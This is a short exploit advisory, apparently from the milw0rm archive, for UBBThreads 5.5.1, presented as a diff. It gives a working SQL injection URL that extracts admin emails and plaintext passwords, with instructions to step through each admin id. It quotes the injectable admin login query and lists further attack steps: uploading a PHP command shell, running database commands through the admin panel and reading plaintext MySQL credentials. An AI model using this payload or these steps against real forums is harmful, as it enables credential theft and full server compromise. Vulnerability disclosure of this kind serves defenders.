@@ -1,0 +1,41 @@
+Discovered: 07-18-08
+By: SecureState R&D Team (sasquatch)
+www.securestate.com
+
+
+Background:
+-----------
+SQL injection has previously been discovered (http://www.securityfocus.com/bid/14052/)
+
+
+New Details:
+------------
+UBBThreads is nice enough to encrypt/mask the regular users' passwords in the database, but stores the admin users' passwords plaintext!
+
+
+Vulnerable Versions:
+--------------------
+Tested on version 5.5.1, others may be vulnerable
+
+
+Admin Login SQL Injection
+-------------------------
+http://www.website.com/ubbthreads/viewmessage.php?Cat=&message=-99%20UNION%20SELECT%20null,email,password,0,0%20FROM%20admin_users%20WHERE%20id=1/*&status=N&box=received
+++  Email is in From: field of forum post
+++  Password is text body of post
+++  Increment the "id" to obtain each admin's credentials (1, 2, 3, etc.)
+
+
+Admin login:
+------------
+http://www.website.com/Admin/login.php
+$query = "SELECT * FROM admin_users WHERE email = '$email' AND password = '$password'";
+
+
+Other Avenues for Attack:
+-------------------------
+++  Turn on file attachments via /ubbthreads/admin/editconfig.php?Cat= and then upload a php command shell as an attachment to a post  ;) 
+++  Query MySQL database via /ubbthreads/admin/dbcommand.php?Cat=
+++  Get MySQL username/password (it is plaintext) - view HTML Source of /ubbthreads/admin/editconfig.php?Cat=  
+
+# milw0rm.com [2009-03-16]
